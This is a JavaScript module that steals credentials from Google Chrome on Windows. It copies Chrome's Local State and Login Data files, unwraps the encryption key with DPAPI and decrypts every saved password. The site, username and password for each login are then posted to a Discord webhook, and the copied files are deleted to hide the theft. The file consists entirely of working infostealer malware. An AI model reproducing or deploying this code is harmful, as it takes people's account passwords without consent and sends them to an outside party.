const fs = require('fs')
const path = require('path')
const crypto = require('crypto')
const sqlite3 = require('sqlite3')
const dpapi = require('win-dpapi')
const { appRealPath } = require('./utils')
const { Webhook } = require('discord-webhook-node')

const LOCAL_STATE = process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Local State'
const LOGIN_DATA = process.env.LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Login Data'

const captureSecretKey = (localState) => {
  const stateObject = JSON.parse(fs.readFileSync(localState, 'utf-8'))
  const buff = Buffer.from(stateObject.os_crypt.encrypted_key, 'base64')
  const buffWithout = buff.filter((value, index, arr) => index > 4)
  const key = dpapi.unprotectData(buffWithout, null, 'CurrentUser')

  return key
}

const decryptPassword = (encryptedPassword, key) => {
  const prefix = encryptedPassword.slice(0, 3)
  const iv = encryptedPassword.slice(3, 15)
  const ciphertext = encryptedPassword.slice(15, encryptedPassword.length - 16)
  const authTag = encryptedPassword.slice(encryptedPassword.length - 16)
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv)

  decipher.setAuthTag(authTag)

  const decryptedCookie = Buffer.concat([decipher.update(ciphertext), decipher.final()])

  return decryptedCookie.toString('utf-8')
}

const allItems = (callback) => {
  const db = new sqlite3.Database('database.db')

  db.serialize(() => {
    db.all('SELECT origin_url, username_value, password_value FROM logins', (err, rows) => {
      if (err) {
        return callback(err, null)
      }

      return callback(null, rows)
    })
  })
  db.close()
}

const removeFiles = async () => {
  const basePath = appRealPath()

  if (fs.existsSync(path.join(basePath, 'state.json'))) fs.rmSync(path.join(basePath, 'state.json'))

  if (fs.existsSync(path.join(basePath, 'database.db'))) fs.rmSync(path.join(basePath, 'database.db'))
}

exports.chrome = async (webhookUrl) => {
  const webhook = new Webhook(webhookUrl)

  await fs.copyFileSync(LOCAL_STATE, 'state.json')
  await fs.copyFileSync(LOGIN_DATA, 'database.db')

  const key = captureSecretKey('state.json')

  const users = []

  allItems(async (err, rows) => {
    for (const row of rows) {
      users.push({
        site: row.origin_url,
        user: row.username_value,
        password: decryptPassword(row.password_value, key),
      })
    }

    const textUsers = users.map(
      (user) =>
        `SITE: ${user.site}\nUSER: ${user.user}\nPASSWORD: ${user.password}\n=============================================\n`
    )

    await webhook.send('```' + textUsers.join('\n') + '```')
    removeFiles()
  })
}
